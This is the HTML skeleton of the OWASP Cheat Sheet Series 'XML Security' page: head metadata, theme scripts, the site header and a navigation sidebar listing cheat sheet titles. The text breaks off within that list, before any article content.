
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Website with the collection of all the cheat sheets of the project.">
      
      
      
        <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">
      
      
        <link rel="prev" href="XML_External_Entity_Prevention_Cheat_Sheet.html">
      
      
        <link rel="next" href="XSS_Filter_Evasion_Cheat_Sheet.html">
      
      
      <link rel="icon" href="../assets/WebSite_Favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
    
    
      
        <title>XML Security - OWASP Cheat Sheet Series</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.0253249f.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#xml-security-cheat-sheet" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../index.html" title="OWASP Cheat Sheet Series" class="md-header__button md-logo" aria-label="OWASP Cheat Sheet Series" data-md-component="logo">
      
  <img src="../assets/OWASP_Logo.svg" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            OWASP Cheat Sheet Series
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              XML Security
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    OWASP/CheatSheetSeries
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../index.html" title="OWASP Cheat Sheet Series" class="md-nav__button md-logo" aria-label="OWASP Cheat Sheet Series" data-md-component="logo">
      
  <img src="../assets/OWASP_Logo.svg" alt="logo">

    </a>
    OWASP Cheat Sheet Series
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    OWASP/CheatSheetSeries
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../index.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../Glossary.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index Alphabetical
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../IndexASVS.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index ASVS
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../IndexMASVS.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index MASVS
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../IndexProactiveControls.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index Proactive Controls
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../IndexTopTen.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index Top 10
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Cheatsheets
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="AJAX_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AJAX Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Abuse_Case_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Abuse Case
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Access_Control_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Access Control
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Attack_Surface_Analysis_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attack Surface Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Authentication_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentication
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Authorization_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authorization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Authorization_Testing_Automation_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authorization Testing Automation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Bean_Validation_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bean Validation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Browser_Extension_Vulnerabilities_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Browser Extension Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="C-Based_Toolchain_Hardening_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    C-Based Toolchain Hardening
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="CI_CD_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CI CD Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Choosing_and_Using_Security_Questions_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Choosing and Using Security Questions
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Clickjacking_Defense_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Clickjacking Defense
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Content_Security_Policy_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Content Security Policy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Credential_Stuffing_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credential Stuffing Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross-Site Request Forgery Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross Site Scripting Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Cryptographic_Storage_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cryptographic Storage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="DOM_Clobbering_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DOM Clobbering Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="DOM_based_XSS_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DOM based XSS Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Database_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Database Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Denial_of_Service_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Denial of Service
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Deserialization_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deserialization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Django_REST_Framework_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Django REST Framework
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Django_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Django Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Docker_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="DotNet_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DotNet Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Error_Handling_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Error Handling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="File_Upload_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File Upload
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Forgot_Password_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Forgot Password
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="GraphQL_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GraphQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="HTML5_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTML5 Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="HTTP_Headers_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP Headers
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="HTTP_Strict_Transport_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP Strict Transport Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Infrastructure_as_Code_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Infrastructure as Code Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Injection Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Injection_Prevention_in_Java_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Injection Prevention in Java
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Input_Validation_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Input Validation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Insecure Direct Object Reference Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="JAAS_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JAAS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="JSON_Web_Token_for_Java_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JSON Web Token for Java
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Java_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Java Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Key_Management_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Key Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Kubernetes_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kubernetes Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="LDAP_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LDAP Injection Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Laravel_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Laravel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Legacy_Application_Management_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Legacy Application Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Logging_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Logging
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Logging_Vocabulary_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Logging Vocabulary
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Mass_Assignment_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mass Assignment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Microservices_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Microservices Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Microservices based Security Arch Doc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Mobile_Application_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mobile Application Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Multifactor_Authentication_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Multifactor Authentication
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="NPM_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NPM Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Network_Segmentation_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Segmentation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="NodeJS_Docker_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NodeJS Docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Nodejs_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nodejs Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="OAuth2_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OAuth2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="OS_Command_Injection_Defense_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OS Command Injection Defense
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="PHP_Configuration_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PHP Configuration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Password_Storage_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password Storage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Pinning_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pinning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Prototype_Pollution_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Prototype Pollution Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Query_Parameterization_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Query Parameterization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="REST_Assessment_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    REST Assessment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="REST_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    REST Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Ruby_on_Rails_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ruby on Rails
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="SAML_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SAML Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="SQL_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Secrets_Management_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Secrets Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Secure_Cloud_Architecture_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Secure Cloud Architecture
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Secure_Product_Design_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Secure Product Design
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Securing_Cascading_Style_Sheets_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Securing Cascading Style Sheets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Server Side Request Forgery Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Session_Management_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Session Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Software_Supply_Chain_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Software Supply Chain Security
  </span>
  

      </a>
    </li>
  

              
